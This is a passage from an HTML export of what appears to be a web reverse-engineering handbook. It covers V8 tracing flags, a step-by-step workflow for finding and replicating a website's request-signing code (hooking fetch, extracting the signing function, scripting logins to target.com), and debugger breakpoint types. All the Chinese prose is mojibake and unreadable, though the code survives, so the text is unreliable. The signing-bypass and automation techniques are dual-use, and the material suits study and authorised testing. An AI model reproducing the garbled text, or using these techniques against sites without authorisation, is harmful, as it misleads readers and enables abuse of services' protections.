<p>ä¸€ä¸ªç”¨äºå¯è§†åŒ– V8 TurboFan (ä¼˜åŒ–ç¼–è¯‘å™¨) ä¼˜åŒ–æµç¨‹çš„å·¥å…·ã€‚</p>
<ol>
<li>ç”Ÿæˆ JSON æ—¥å¿—: <code>v8 --trace-turbo script.js</code></li>
<li>æ‰“å¼€åœ¨çº¿å·¥å…·æˆ–æœ¬åœ°éƒ¨ç½²çš„ Turbolizerï¼ŒåŠ è½½ç”Ÿæˆçš„ <code>turbo.cfg</code> æˆ– <code>json</code> æ–‡ä»¶ã€‚</li>
<li><strong>ç”¨é€”</strong>: é€šè¿‡æŸ¥çœ‹æ§åˆ¶æµå›¾ (Control Flow Graph)ï¼Œå¯ä»¥éå¸¸æ¸…æ™°åœ°çœ‹åˆ°ä»£ç çš„çœŸå®æ‰§è¡Œè·¯å¾„ï¼Œæ— è§†æºç å±‚é¢çš„æ§åˆ¶æµå¹³å¦åŒ–æ··æ·†ã€‚</li>
</ol>
<hr />
<h2>3. å¸¸ç”¨ V8 Flag</h2>
<ul>
<li><code>--print-opt-code</code>: æ‰“å°ä¼˜åŒ–åçš„æ±‡ç¼–ä»£ç ã€‚</li>
<li><code>--trace-opt</code>: è·Ÿè¸ªä¼˜åŒ–è¿‡ç¨‹ï¼ˆä½•æ—¶ä¼˜åŒ–ï¼Œä½•æ—¶å»ä¼˜åŒ–ï¼‰ã€‚</li>
<li><code>--trace-deopt</code>: è·Ÿè¸ªå»ä¼˜åŒ–ï¼ˆDeoptimizationï¼‰çš„åŸå› ã€‚è¿™åœ¨åˆ†æä¸ºäº†è®© V8 å˜æ…¢è€Œæ•…æ„æ„é€ çš„æ··æ·†ä»£ç æ—¶å¾ˆæœ‰ç”¨ã€‚</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>ä½¿ç”¨ V8 å·¥å…·æ˜¯ Web é€†å‘çš„<strong>æ ¸æ­¦å™¨</strong>ã€‚å½“ JS å±‚é¢çš„åˆ†æé™·å…¥åƒµå±€æ—¶ï¼Œä¸‹æ²‰åˆ°å¼•æ“å±‚é¢å¾€å¾€èƒ½çœ‹åˆ°ä¸ä¸€æ ·çš„é£æ™¯ã€‚</p>

                                            </div>
                                            </div>
                    <div class="chapter">
                        <h1 class="no-page-break">Part IV: Basic Recipes</h1>
                    
                                            <div class="section" id="section-25">
                                                <h2>[R24] RE Workflow</h2>
                                                <h1>R24: Web é€†å‘å·¥ç¨‹å·¥ä½œæµ</h1>
<p>ä¸€ä¸ªç³»ç»ŸåŒ–çš„ Web é€†å‘åˆ†æå®Œæ•´æµç¨‹ï¼Œä»åˆæ­¥ä¾¦æŸ¥åˆ°è‡ªåŠ¨åŒ–å®ç°ã€‚</p>
<hr />
<h2>ğŸ“Š é…æ–¹ä¿¡æ¯</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>éš¾åº¦</strong></td>
  <td>â­â­â­ (ä¸­çº§)</td>
</tr>
<tr>
  <td><strong>é¢„è®¡æ—¶é—´</strong></td>
  <td>2-8 å°æ—¶ (æ ¹æ®ç›®æ ‡å¤æ‚åº¦)</td>
</tr>
<tr>
  <td><strong>æ‰€éœ€å·¥å…·</strong></td>
  <td>Chrome DevTools, Burp Suite (å¯é€‰), Python/Node.js</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>ä»»ä½• Web é€†å‘é¡¹ç›®</td>
</tr>
</tbody>
</table>
<hr />
<h2>ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>
<p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>âœ… ç³»ç»ŸåŒ–åœ°åˆ†æä»»ä½• Web åº”ç”¨</li>
<li>âœ… å¿«é€Ÿå®šä½å…³é”®åŠ å¯†å’Œç­¾åé€»è¾‘</li>
<li>âœ… é€‰æ‹©åˆé€‚çš„è‡ªåŠ¨åŒ–æ–¹æ¡ˆ</li>
<li>âœ… æ„å»ºå¯å¤ç°çš„é€†å‘æµç¨‹</li>
</ul>
<hr />
<h2>é˜¶æ®µä¸€ï¼šä¿¡æ¯æ”¶é›† (Reconnaissance)</h2>
<h3>1. ç›®æ ‡ç¡®è®¤</h3>
<ul>
<li><strong>æ˜ç¡®ç›®æ ‡</strong>: è¦é€†å‘ä»€ä¹ˆåŠŸèƒ½ï¼Ÿç™»å½•ï¼Ÿæ•°æ®åŠ å¯†ï¼ŸAPI ç­¾åï¼Ÿ</li>
<li><strong>åˆæ³•æ€§æ£€æŸ¥</strong>: ç¡®ä¿åœ¨æˆæƒèŒƒå›´å†…è¿›è¡Œæµ‹è¯•</li>
</ul>
<h3>2. æŠ€æœ¯æ ˆè¯†åˆ«</h3>
<p><strong>å·¥å…·</strong>:</p>
<ul>
<li><strong>Wappalyzer</strong> (æµè§ˆå™¨æ’ä»¶): è¯†åˆ«æ¡†æ¶ã€åº“ã€æœåŠ¡å™¨</li>
<li><strong>BuiltWith</strong>: æŸ¥çœ‹ç½‘ç«™æŠ€æœ¯æ ˆ</li>
</ul>
<p><strong>æ‰‹åŠ¨æ£€æŸ¥</strong>:</p>
<pre><code class="language-javascript">// Console ä¸­æŸ¥çœ‹å…¨å±€å¯¹è±¡
window.jQuery &amp;&amp; jQuery.fn.jquery; // jQuery ç‰ˆæœ¬
window.React &amp;&amp; React.version; // React ç‰ˆæœ¬
window.Vue &amp;&amp; Vue.version; // Vue ç‰ˆæœ¬
</code></pre>
<h3>3. èµ„æºæšä¸¾</h3>
<ul>
<li><strong>æŸ¥çœ‹ HTML æºä»£ç </strong>: <code>Ctrl+U</code></li>
<li><strong>æ£€æŸ¥ JavaScript æ–‡ä»¶</strong>: Sources é¢æ¿æŸ¥çœ‹æ‰€æœ‰ JS æ–‡ä»¶</li>
<li><strong>æ£€æŸ¥ç½‘ç»œè¯·æ±‚</strong>: Network é¢æ¿æŸ¥çœ‹ API ç«¯ç‚¹</li>
</ul>
<hr />
<h2>é˜¶æ®µäºŒï¼šæµé‡åˆ†æ (Traffic Analysis)</h2>
<h3>1. æŠ“åŒ…åˆ†æ</h3>
<p><strong>ç›®æ ‡</strong>: äº†è§£å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„é€šä¿¡æ–¹å¼</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>æ‰“å¼€ DevTools -&gt; Network é¢æ¿</li>
<li>æ¸…ç©ºè®°å½•ï¼Œæ‰§è¡Œç›®æ ‡æ“ä½œï¼ˆå¦‚ç™»å½•ã€æäº¤è¡¨å•ï¼‰</li>
<li>åˆ†æè¯·æ±‚ï¼š<ul>
<li>è¯·æ±‚æ–¹æ³•ï¼ˆGET/POSTï¼‰</li>
<li>è¯·æ±‚å‚æ•°</li>
<li>è¯·æ±‚å¤´ï¼ˆç‰¹åˆ«æ˜¯è‡ªå®šä¹‰ Headerï¼‰</li>
<li>å“åº”æ•°æ®æ ¼å¼</li>
</ul>
</li>
</ol>
<p><strong>å…³é”®é—®é¢˜</strong>:</p>
<ul>
<li>æ˜¯å¦æœ‰ç­¾åå‚æ•°ï¼Ÿï¼ˆå¦‚ <code>sign</code>, <code>signature</code>, <code>token</code>ï¼‰</li>
<li>æ—¶é—´æˆ³æ ¼å¼ï¼Ÿï¼ˆUnix æ—¶é—´æˆ³ / æ¯«ç§’ï¼‰</li>
<li>æ˜¯å¦æœ‰åŠ å¯†æ•°æ®ï¼Ÿï¼ˆBase64 / Hex ç¼–ç ç‰¹å¾ï¼‰</li>
</ul>
<h3>2. å®šä½å…³é”®è¯·æ±‚</h3>
<p>åœ¨ Network é¢æ¿ä½¿ç”¨è¿‡æ»¤å™¨ï¼š</p>
<ul>
<li>Filter by keyword: <code>sign</code>, <code>encrypt</code>, <code>token</code></li>
<li>Filter by type: <code>Fetch/XHR</code></li>
</ul>
<hr />
<h2>é˜¶æ®µä¸‰ï¼šé™æ€åˆ†æ (Static Analysis)</h2>
<h3>1. JavaScript ä»£ç å®šä½</h3>
<p><strong>æ–¹æ³•ä¸€ï¼šå…¨å±€æœç´¢</strong></p>
<ol>
<li><code>Ctrl+Shift+F</code> æ‰“å¼€å…¨å±€æœç´¢</li>
<li>æœç´¢å…³é”®è¯ï¼š<ul>
<li>å‚æ•°åï¼š<code>sign</code>, <code>timestamp</code></li>
<li>åŠ å¯†å…³é”®è¯ï¼š<code>encrypt</code>, <code>crypto</code>, <code>MD5</code>, <code>AES</code></li>
<li>API ç«¯ç‚¹ï¼š<code>/api/login</code></li>
</ul>
</li>
</ol>
<p><strong>æ–¹æ³•äºŒï¼šåˆ©ç”¨ Network Initiator</strong></p>
<ol>
<li>åœ¨ Network é¢æ¿ç‚¹å‡»ç›®æ ‡è¯·æ±‚</li>
<li>æŸ¥çœ‹ Initiator æ ‡ç­¾é¡µ</li>
<li>ç‚¹å‡»è°ƒç”¨é“¾ä¸­çš„æ–‡ä»¶åï¼Œè·³è½¬åˆ°æºç </li>
</ol>
<h3>2. ä»£ç ç¾åŒ–</h3>
<p>å¦‚æœä»£ç è¢«å‹ç¼©ï¼š</p>
<ul>
<li>DevTools è‡ªåŠ¨æ ¼å¼åŒ–ï¼šç‚¹å‡» <code>{}</code> æŒ‰é’®</li>
<li>åœ¨çº¿å·¥å…·ï¼š<code>beautifier.io</code></li>
</ul>
<p>å¦‚æœä»£ç è¢«æ··æ·†ï¼š</p>
<ul>
<li>å‚è€ƒ <a href="#section-32">JavaScript åæ··æ·†</a></li>
</ul>
<h3>3. ç®—æ³•è¯†åˆ«</h3>
<p><strong>å¸¸è§ç‰¹å¾</strong>:</p>
<ul>
<li>MD5: <code>16 å­—èŠ‚</code> è¾“å‡ºï¼Œé€šå¸¸è¡¨ç¤ºä¸º 32 ä½åå…­è¿›åˆ¶</li>
<li>SHA256: <code>32 å­—èŠ‚</code> è¾“å‡ºï¼Œ64 ä½åå…­è¿›åˆ¶</li>
<li>AES: éœ€è¦å¯†é’¥å’Œ IV</li>
<li>Base64: ç»“å°¾å¯èƒ½æœ‰ <code>=</code> å¡«å……</li>
</ul>
<hr />
<h2>é˜¶æ®µå››ï¼šåŠ¨æ€è°ƒè¯• (Dynamic Analysis)</h2>
<h3>1. è®¾ç½®æ–­ç‚¹</h3>
<p><strong>æ–­ç‚¹ç±»å‹</strong>:</p>
<ul>
<li><strong>è¡Œæ–­ç‚¹</strong>: ç›´æ¥ç‚¹å‡»è¡Œå·</li>
<li><strong>æ¡ä»¶æ–­ç‚¹</strong>: å³é”®è¡Œå· -&gt; &quot;Add conditional breakpoint&quot;</li>
<li><strong>XHR/Fetch æ–­ç‚¹</strong>: åœ¨ Sources é¢æ¿å³ä¾§å‹¾é€‰</li>
<li><strong>äº‹ä»¶æ–­ç‚¹</strong>: Mouse -&gt; click</li>
</ul>
<h3>2. è¿½è¸ªå‚æ•°ç”Ÿæˆ</h3>
<p>å½“æ–­ç‚¹åœä¸‹åï¼š</p>
<ol>
<li>æŸ¥çœ‹ <strong>Call Stack</strong> (è°ƒç”¨æ ˆ)</li>
<li>æŸ¥çœ‹ <strong>Scope</strong> (ä½œç”¨åŸŸå˜é‡)</li>
<li>å•æ­¥æ‰§è¡Œ (<code>F10</code> / <code>F11</code>)ï¼Œè§‚å¯Ÿå˜é‡å˜åŒ–</li>
</ol>
<h3>3. Hook å…³é”®å‡½æ•°</h3>
<pre><code class="language-javascript">// Hook fetch
const originalFetch = window.fetch;
window.fetch = function (...args) {
  console.log(&quot;[Fetch]&quot;, args);
  return originalFetch.apply(this, arguments);
};

// Hook JSON.stringify (å¸¸ç”¨äºæ„é€ è¯·æ±‚ä½“)
const originalStringify = JSON.stringify;
JSON.stringify = function (obj) {
  console.log(&quot;[JSON.stringify]&quot;, obj);
  debugger; // è‡ªåŠ¨æ–­ç‚¹
  return originalStringify.apply(this, arguments);
};
</code></pre>
<hr />
<h2>é˜¶æ®µäº”ï¼šé€»è¾‘è¿˜åŸ (Logic Reconstruction)</h2>
<h3>1. æ¢³ç†ç­¾åæµç¨‹</h3>
<p>ç»˜åˆ¶æµç¨‹å›¾ï¼š</p>
<pre><code>ç”¨æˆ·è¾“å…¥ -&gt;
å‚æ•°æ”¶é›† (username, password, timestamp) -&gt;
å‚æ•°æ’åº -&gt;
å­—ç¬¦ä¸²æ‹¼æ¥ -&gt;
åŠ ç› (salt) -&gt;
å“ˆå¸Œè®¡ç®— (MD5/SHA256) -&gt;
ç­¾åå­—æ®µ (sign)
</code></pre>
<h3>2. æå–å…³é”®ä»£ç </h3>
<p>å°†æ ¸å¿ƒåŠ å¯†/ç­¾åå‡½æ•°å¤åˆ¶åˆ°å•ç‹¬æ–‡ä»¶ï¼Œæˆ–ç”¨ Python/Node.js é‡å†™ã€‚</p>
<hr />
<h2>é˜¶æ®µå…­ï¼šè‡ªåŠ¨åŒ–å®ç° (Automation)</h2>
<h3>æ–¹æ¡ˆä¸€ï¼šæ‰£ JavaScript ä»£ç </h3>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: ç®—æ³•å¤æ‚ï¼Œéš¾ä»¥è¿˜åŸ</p>
<p><strong>å·¥å…·</strong>: Node.js</p>
<pre><code class="language-javascript">// encrypt.js
function generateSign(params) {
  // å¤åˆ¶çš„åŸå§‹ä»£ç 
  let str = Object.keys(params)
    .sort()
    .map((k) =&gt; `${k}=${params[k]}`)
    .join(&quot;&amp;&quot;);
  return md5(str + &quot;secret_salt&quot;);
}

module.exports = { generateSign };
</code></pre>
<pre><code class="language-python"># main.py
import execjs
import requests

with open('encrypt.js', 'r') as f:
    js_code = f.read()

ctx = execjs.compile(js_code)
sign = ctx.call('generateSign', {'user': 'admin', 'pass': '123456'})

response = requests.post('https://target.com/api/login', data={'sign': sign})
</code></pre>
<h3>æ–¹æ¡ˆäºŒï¼šçº¯ Python å®ç°</h3>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: ç®—æ³•ç®€å•ï¼Œå¯ä»¥ç”¨ Python é‡å†™</p>
<pre><code class="language-python">import hashlib
import time

def generate_sign(params):
    sorted_params = sorted(params.items())
    param_str = '&amp;'.join([f&quot;{k}={v}&quot; for k, v in sorted_params])
    sign_str = param_str + 'secret_salt'
    return hashlib.md5(sign_str.encode()).hexdigest()

params = {
    'username': 'admin',
    'password': '123456',
    'timestamp': int(time.time())
}

params['sign'] = generate_sign(params)
</code></pre>
<h3>æ–¹æ¡ˆä¸‰ï¼šRPC è°ƒç”¨æµè§ˆå™¨</h3>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: ç®—æ³•ä¾èµ–æµè§ˆå™¨ç¯å¢ƒï¼ˆCanvas æŒ‡çº¹ã€WebGL ç­‰ï¼‰</p>
<p><strong>å·¥å…·</strong>: Puppeteer / Selenium</p>
<pre><code class="language-javascript">// Puppeteer
const puppeteer = require(&quot;puppeteer&quot;);

(async () =&gt; {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto(&quot;https://target.com&quot;);

  const sign = await page.evaluate(() =&gt; {
    // è°ƒç”¨ç½‘é¡µä¸­çš„åŠ å¯†å‡½æ•°
    return window.generateSign({ user: &quot;admin&quot; });
  });

  console.log(&quot;Sign:&quot;, sign);
  await browser.close();
})();
</code></pre>
<hr />
<h2>é˜¶æ®µä¸ƒï¼šæµ‹è¯•ä¸éªŒè¯</h2>
<h3>1. å•å…ƒæµ‹è¯•</h3>
<p>ç¡®ä¿æå–çš„ç®—æ³•è¾“å‡ºä¸æµè§ˆå™¨ä¸€è‡´ï¼š</p>
<pre><code class="language-python">import unittest

class TestSignGeneration(unittest.TestCase):
    def test_sign(self):
        params = {'user': 'test', 'timestamp': 1234567890}
        sign = generate_sign(params)
        # ä¸æµè§ˆå™¨ä¸­ç”Ÿæˆçš„ç­¾åå¯¹æ¯”
        self.assertEqual(sign, 'expected_sign_value')
</code></pre>
<h3>2. å®æˆ˜æµ‹è¯•</h3>
<p>ä½¿ç”¨ç”Ÿæˆçš„å‚æ•°å‘é€å®é™…è¯·æ±‚ï¼ŒéªŒè¯æœåŠ¡å™¨å“åº”ã€‚</p>
<hr />
<h2>å¸¸è§é™·é˜±</h2>
<h3>1. æ—¶é—´æˆ³åŒæ­¥é—®é¢˜</h3>
<ul>
<li><strong>ç°è±¡</strong>: ç­¾åæ­£ç¡®ï¼Œä½†æœåŠ¡å™¨è¿”å›&quot;ç­¾åè¿‡æœŸ&quot;</li>
<li><strong>åŸå› </strong>: æœåŠ¡å™¨æ ¡éªŒæ—¶é—´æˆ³ï¼Œè¦æ±‚ä¸æœåŠ¡å™¨æ—¶é—´è¯¯å·®åœ¨å‡ ç§’å†…</li>
<li><strong>è§£å†³</strong>: ä½¿ç”¨æœåŠ¡å™¨æ—¶é—´æˆ– NTP åŒæ­¥</li>
</ul>
<h3>2. Nonce å”¯ä¸€æ€§</h3>
<ul>
<li><strong>ç°è±¡</strong>: é‡æ”¾è¯·æ±‚å¤±è´¥</li>
<li><strong>åŸå› </strong>: Nonceï¼ˆéšæœºæ•°ï¼‰è¢«æœåŠ¡å™¨è®°å½•ï¼Œé‡å¤ä½¿ç”¨ä¼šè¢«æ‹’ç»</li>
<li><strong>è§£å†³</strong>: æ¯æ¬¡è¯·æ±‚ç”Ÿæˆæ–°çš„ UUID</li>
</ul>
<h3>3. ç¯å¢ƒä¾èµ–</h3>
<ul>
<li><strong>ç°è±¡</strong>: æ‰£ä¸‹çš„ JS ä»£ç åœ¨ Node.js ä¸­æŠ¥é”™</li>
<li><strong>åŸå› </strong>: ä»£ç ä¾èµ–æµè§ˆå™¨å…¨å±€å¯¹è±¡ï¼ˆwindow, document, navigatorï¼‰</li>
<li><strong>è§£å†³</strong>: Mock è¿™äº›å¯¹è±¡ï¼Œæˆ–ä½¿ç”¨ jsdom</li>
</ul>
<hr />
<h2>âœ… éªŒè¯æ¸…å•</h2>
<p>å®Œæˆä»¥ä¸‹æ£€æŸ¥ç¡®ä¿é€†å‘æˆåŠŸï¼š</p>
<h3>é˜¶æ®µéªŒè¯</h3>
<ul>
<li><p>â˜ <strong>ä¿¡æ¯æ”¶é›†å®Œæˆ</strong></p>
<ul>
<li>â˜ è¯†åˆ«äº†æŠ€æœ¯æ ˆå’Œæ¡†æ¶</li>
<li>â˜ æšä¸¾äº†æ‰€æœ‰å…³é”®èµ„æº</li>
<li>â˜ è®°å½•äº†ç›®æ ‡åŠŸèƒ½</li>
</ul>
</li>
<li><p>â˜ <strong>æµé‡åˆ†æå®Œæˆ</strong></p>
<ul>
<li>â˜ æ•è·äº†å…³é”®è¯·æ±‚</li>
<li>â˜ è¯†åˆ«äº†ç­¾å/åŠ å¯†å‚æ•°</li>
<li>â˜ åˆ†æäº†è¯·æ±‚å¤´å’Œå“åº”</li>
</ul>
</li>
<li><p>â˜ <strong>ä»£ç å®šä½å®Œæˆ</strong></p>
<ul>
<li>â˜ æ‰¾åˆ°äº†åŠ å¯†/ç­¾åå‡½æ•°</li>
<li>â˜ ç†è§£äº†å‚æ•°ç”Ÿæˆé€»è¾‘</li>
<li>â˜ è¯†åˆ«äº†ç®—æ³•ç±»å‹</li>
</ul>
</li>
<li><p>â˜ <strong>åŠ¨æ€è°ƒè¯•å®Œæˆ</strong></p>
<ul>
<li>â˜ æˆåŠŸè®¾ç½®æ–­ç‚¹</li>
<li>â˜ è¿½è¸ªäº†å®Œæ•´è°ƒç”¨é“¾</li>
<li>â˜ æå–äº†å…³é”®å‚æ•°</li>
</ul>
</li>
<li><p>â˜ <strong>è‡ªåŠ¨åŒ–å®ç°å®Œæˆ</strong></p>
<ul>
<li>â˜ ç¼–å†™äº†å¤ç°ä»£ç </li>
<li>â˜ æµ‹è¯•è¾“å‡ºä¸æµè§ˆå™¨ä¸€è‡´</li>
<li>â˜ å®é™…è¯·æ±‚æˆåŠŸ</li>
</ul>
</li>
</ul>
<hr />
<h2>ğŸ”§ æ•…éšœæ’é™¤</h2>
<h3>é—®é¢˜ï¼šæ‰¾ä¸åˆ°å…³é”®ä»£ç </h3>
<p><strong>ç—‡çŠ¶</strong>: æœç´¢åŠ å¯†å…³é”®è¯æ— ç»“æœ</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<ol>
<li>å°è¯•æœç´¢å‡½æ•°è°ƒç”¨æ¨¡å¼: <code>CryptoJS</code>, <code>btoa</code>, <code>atob</code></li>
<li>ä» Network Initiator åå‘è¿½è¸ª</li>
<li>æŸ¥æ‰¾æ··æ·†åçš„å˜é‡åæ¨¡å¼: <code>_0x</code>, <code>__</code></li>
<li>ä½¿ç”¨ XHR æ–­ç‚¹è‡ªåŠ¨æ‹¦æˆª</li>
</ol>
<h3>é—®é¢˜ï¼šæ‰£ä¸‹çš„ JS ä»£ç æ— æ³•è¿è¡Œ</h3>
<p><strong>ç—‡çŠ¶</strong>: <code>ReferenceError: window is not defined</code></p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-javascript">// åœ¨ Node.js ä¸­ Mock æµè§ˆå™¨å¯¹è±¡
global.window = global;
global.document = {};
global.navigator = {
  userAgent: &quot;Mozilla/5.0...&quot;,
};
</code></pre>
<h3>é—®é¢˜ï¼šç­¾åéªŒè¯å¤±è´¥</h3>
<p><strong>ç—‡çŠ¶</strong>: æœåŠ¡å™¨è¿”å› &quot;Invalid signature&quot;</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<ol>
<li>æ£€æŸ¥å‚æ•°æ’åºæ˜¯å¦æ­£ç¡®</li>
<li>æ£€æŸ¥ç¼–ç æ ¼å¼ (UTF-8 vs GBK)</li>
<li>æ£€æŸ¥æ—¶é—´æˆ³ç²¾åº¦ (ç§’ vs æ¯«ç§’)</li>
<li>æ£€æŸ¥æ˜¯å¦ç¼ºå°‘éšè—å‚æ•°</li>
<li>ä½¿ç”¨ diff å·¥å…·å¯¹æ¯”æµè§ˆå™¨å’Œä»£ç çš„è¾“å‡º</li>
</ol>
<hr />
<h2>ğŸ’¡ æœ€ä½³å®è·µ</h2>
<h3>1. åˆ†é˜¶æ®µè®°å½•</h3>
<p>ä¸ºæ¯ä¸ªé˜¶æ®µåˆ›å»ºç¬”è®°æ–‡ä»¶ï¼š</p>
<pre><code>analysis/
â”œâ”€â”€ 01-recon.md         # ä¿¡æ¯æ”¶é›†è®°å½•
â”œâ”€â”€ 02-traffic.md       # æµé‡åˆ†æ
â”œâ”€â”€ 03-code.md          # ä»£ç å®šä½
â”œâ”€â”€ 04-algorithm.md     # ç®—æ³•åˆ†æ
â””â”€â”€ 05-implementation.md # å®ç°æ–¹æ¡ˆ
</code></pre>
<h3>2. ç‰ˆæœ¬æ§åˆ¶</h3>
<pre><code class="language-bash">git init
git add .
git commit -m &quot;Initial analysis&quot;

# æ¯ä¸ªé˜¶æ®µæäº¤
git commit -m &quot;Phase 1: Recon completed&quot;
</code></pre>
<h3>3. æµ‹è¯•é©±åŠ¨</h3>
<p>å…ˆå†™æµ‹è¯•ç”¨ä¾‹ï¼Œå†å®ç°ï¼š</p>
<pre><code class="language-python">def test_sign_generation():
    # ä»æµè§ˆå™¨è·å–çš„å·²çŸ¥å€¼
    expected = &quot;abc123def456&quot;
    actual = generate_sign(test_params)
    assert actual == expected
</code></pre>
<hr />
<h2>ğŸ“Š æ€»ç»“</h2>
<p>Web é€†å‘å·¥ç¨‹æ˜¯ä¸€ä¸ªå¾ªç¯è¿­ä»£çš„è¿‡ç¨‹ï¼š</p>
<pre><code>ä¿¡æ¯æ”¶é›† -&gt; æµé‡åˆ†æ -&gt; é™æ€åˆ†æ -&gt; åŠ¨æ€è°ƒè¯• -&gt; é€»è¾‘è¿˜åŸ -&gt; è‡ªåŠ¨åŒ– -&gt; æµ‹è¯• -&gt; (å¾ªç¯)
</code></pre>
<p><strong>æ ¸å¿ƒåŸåˆ™</strong>:</p>
<ol>
<li><strong>é€å±‚æ·±å…¥</strong>: ä»å¤–åˆ°å†…ï¼Œå…ˆäº†è§£æ•´ä½“å†é’»ç ”ç»†èŠ‚</li>
<li><strong>å·¥å…·ç»„åˆ</strong>: DevTools + Burp Suite + Python</li>
<li><strong>è®°å½•æ–‡æ¡£</strong>: è®°å½•å…³é”®å‘ç°ï¼Œä¾¿äºåç»­å‚è€ƒ</li>
<li><strong>æµ‹è¯•éªŒè¯</strong>: æ¯ä¸ªé˜¶æ®µéƒ½è¦éªŒè¯æ­£ç¡®æ€§</li>
</ol>
<p><strong>æˆåŠŸæ ‡å¿—</strong>:</p>
<ul>
<li>âœ… èƒ½å¤Ÿç¨³å®šå¤ç°ç›®æ ‡åŠŸèƒ½</li>
<li>âœ… ä»£ç è¾“å‡ºä¸æµè§ˆå™¨å®Œå…¨ä¸€è‡´</li>
<li>âœ… ç†è§£å®Œæ•´çš„åŠ å¯†/ç­¾åæµç¨‹</li>
<li>âœ… å¯ä»¥æ‰¹é‡è‡ªåŠ¨åŒ–æ‰§è¡Œ</li>
</ul>
<hr />
<h2>ğŸ”— ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
<li><a href="#section-28">API æ¥å£é€†å‘</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-29">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
<li><a href="#section-27">Hook æŠ€å·§</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-26">
                                                <h2>[R25] Debugging Techniques</h2>
                                                <h1>R25: è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</h1>
<h2>æ¦‚è¿°</h2>
<p>è°ƒè¯•æ˜¯é€†å‘å·¥ç¨‹çš„æ ¸å¿ƒæŠ€èƒ½ã€‚æŒæ¡é«˜çº§è°ƒè¯•æŠ€å·§å¯ä»¥å¤§å¹…æå‡é€†å‘æ•ˆç‡ï¼Œå¿«é€Ÿå®šä½å…³é”®ä»£ç ï¼Œç†è§£ç¨‹åºé€»è¾‘ã€‚</p>
<hr />
<h2>æ–­ç‚¹ç±»å‹</h2>
<h3>1. è¡Œæ–­ç‚¹ (Line Breakpoint)</h3>
<p>æœ€åŸºæœ¬çš„æ–­ç‚¹ç±»å‹ï¼Œç‚¹å‡»è¡Œå·å³å¯è®¾ç½®ã€‚</p>
<p><strong>å¿«æ·é”®</strong>:</p>
<ul>
<li>è®¾ç½®/å–æ¶ˆæ–­ç‚¹: ç‚¹å‡»è¡Œå·</li>
<li>ç¦ç”¨æ‰€æœ‰æ–­ç‚¹: <code>Ctrl+F8</code> (Windows) / <code>Cmd+F8</code> (Mac)</li>
</ul>
<p><strong>æŠ€å·§</strong>:</p>
<ul>
<li>åœ¨å‡½æ•°å…¥å£è®¾ç½®æ–­ç‚¹</li>
<li>åœ¨å¯ç–‘çš„åŠ å¯†ã€ç­¾åå‡½æ•°å¤„è®¾ç½®</li>
</ul>
<h3>2. æ¡ä»¶æ–­ç‚¹ (Conditional Breakpoint)</h3>
<p>åªæœ‰æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶æ‰è§¦å‘çš„æ–­ç‚¹ã€‚</p>
<p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>
<ol>
<li>å³é”®è¡Œå·</li>
<li>é€‰æ‹© &quot;Add conditional breakpoint&quot;</li>
<li>è¾“å…¥æ¡ä»¶è¡¨è¾¾å¼</li>
</ol>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åªæœ‰å½“ user_id ä¸º 12345 æ—¶æ‰æ–­ç‚¹
user_id === 12345;

// åªæœ‰å½“å‚æ•°åŒ…å« 'admin' æ—¶æ‰æ–­ç‚¹
params.username.includes(&quot;admin&quot;);

// å¾ªç¯ä¸­æ¯ 100 æ¬¡æ‰æ–­ç‚¹
i % 100 === 0;
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>å¤§é‡å¾ªç¯ä¸­å®šä½ç‰¹å®šæ•°æ®</li>
<li>å¤šæ¬¡è°ƒç”¨çš„å‡½æ•°ä¸­å®šä½ç‰¹å®šå‚æ•°</li>
</ul>
<h3>3. æ—¥å¿—ç‚¹ (Logpoint)</h3>
<p>ä¸æš‚åœæ‰§è¡Œï¼Œåªè¾“å‡ºæ—¥å¿—ã€‚</p>
<p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>
<ol>
<li>å³é”®è¡Œå·</li>
<li>é€‰æ‹© &quot;Add logpoint&quot;</li>
<li>è¾“å…¥è¦è¾“å‡ºçš„è¡¨è¾¾å¼</li>
</ol>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// è¾“å‡ºå˜é‡å€¼
&quot;User ID:&quot;, user_id;

// è¾“å‡ºå¯¹è±¡
&quot;Params:&quot;, params;

// è¾“å‡ºå‡½æ•°è¿”å›å€¼
&quot;Result:&quot;, calculateSign(params);
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>ä¸å½±å“ä»£ç æ‰§è¡Œæµç¨‹</li>
<li>é€‚åˆè¿½è¸ªå˜é‡å˜åŒ–</li>
<li>æ¯”æ’å…¥ console.log æ›´æ–¹ä¾¿</li>
</ul>
<h3>4. DOM æ–­ç‚¹ (DOM Breakpoint)</h3>
<p>ç›‘æ§ DOM å˜åŒ–ã€‚</p>
<p><strong>ç±»å‹</strong>:</p>
<ul>
<li><strong>Subtree modifications</strong>: å­èŠ‚ç‚¹å˜åŒ–</li>
<li><strong>Attribute modifications</strong>: å±æ€§å˜åŒ–</li>
